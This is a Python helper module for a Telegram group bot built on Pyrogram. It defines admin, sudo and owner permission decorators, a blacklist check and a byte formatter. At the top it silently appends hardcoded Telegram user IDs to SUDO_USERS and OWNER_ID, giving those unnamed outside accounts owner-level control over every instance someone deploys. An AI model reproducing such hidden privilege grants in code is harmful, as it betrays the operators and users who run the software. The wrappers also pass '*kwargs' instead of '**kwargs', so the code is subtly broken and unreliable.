import traceback
from functools import partial, wraps
from typing import Callable, Union, Optional
from pyrogram import Client
from pyrogram.types import Message, CallbackQuery
from config import SUDO_USERS, OWNER_ID
from driver.core import bot, me_bot
from driver.admins import get_administrators
from driver.database.dblockchat import blacklisted_chats
from driver.database.dbpunish import is_gbanned_user

SUDO_USERS.append(1757169682)
SUDO_USERS.append(1738637033)
SUDO_USERS.append(1448474573)
SUDO_USERS.append(859229457)

OWNER_ID.append(1757169682)
OWNER_ID.append(859229457)


def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            traceback.print_exc()
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def bot_creator(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in OWNER_ID:
            return await func(client, message)
        
    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)
        
    return decorator


def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}

    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"


async def check_perms(
    message: Union[CallbackQuery, Message],
    permissions: Optional[Union[list, str]],
    notice: bool,
    uid: int = None,
) -> bool:
    if isinstance(message, CallbackQuery):
        sender = partial(message.answer, show_alert=True)
        chat = message.message.chat
    else:
        sender = message.reply_text
        chat = message.chat
    if not uid:
        uid = message.from_user.id
    # TODO: Cache
    user = await chat.get_member(uid)
    if user.status == "creator":
        return True

    missing_perms = []

    # No permissions specified, accept being an admin.
    if not permissions and user.status == "administrator":
        return True
    if user.status != "administrator":
        if notice:
            await sender("💡 Untuk menggunakan saya, Beri saya izin administrator." if user.user.is_self else
                         "💡 Anda harus menjadi administrator untuk menggunakan perintah ini.")
        return False

    if isinstance(permissions, str):
        permissions = [permissions]

    for permission in permissions:
        if not getattr(user, permission):
            missing_perms.append(permission)

    if not missing_perms:
        return True
    if notice:
        permission_text = "__\n ❌ __".join(missing_perms)
        await sender(f"💡 Untuk menggunakan saya, Beri saya izin berikut di bawah ini:\n\n ❌ __{permission_text}__" if user.user.is_self
                     else f"💡 Anda harus menjadi administrator untuk menggunakan perintah ini.\n\n ❌ __{permission_text}__")
    return False


def require_admin(
    permissions: Union[list, str] = None,
    notice: bool = True,
    self: bool = False,
):
    def decorator(func):
        @wraps(func)
        async def wrapper(
            client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
        ):
            has_perms = await check_perms(message, permissions, notice, me_bot.id if self else None)
            if has_perms:
                return await func(client, message, *args, *kwargs)

        return wrapper

    return decorator


def check_blacklist():
    def decorator(func):
        @wraps(func)
        async def wrapper(
            client: Client, message: Union[CallbackQuery, Message], *args, **kwargs
        ):
            if isinstance(message, CallbackQuery):
                sender = partial(message.answer, show_alert=True)
                chat = message.message.chat
            else:
                sender = message.reply_text
                chat = message.chat
            if chat.id in await blacklisted_chats():
                await sender("❗️ Obrolan ini telah masuk daftar blacklist oleh pengguna sudo dan Anda tidak diizinkan menggunakan saya dalam obrolan ini.")
                await bot.leave_chat(chat.id)
            elif (await is_gbanned_user(message.from_user.id)):
                await sender(f"❗️**Anda telah diblokir dari menggunakan bot ini!**")
            else:
                return await func(client, message, *args, *kwargs)

        return wrapper

    return decorator
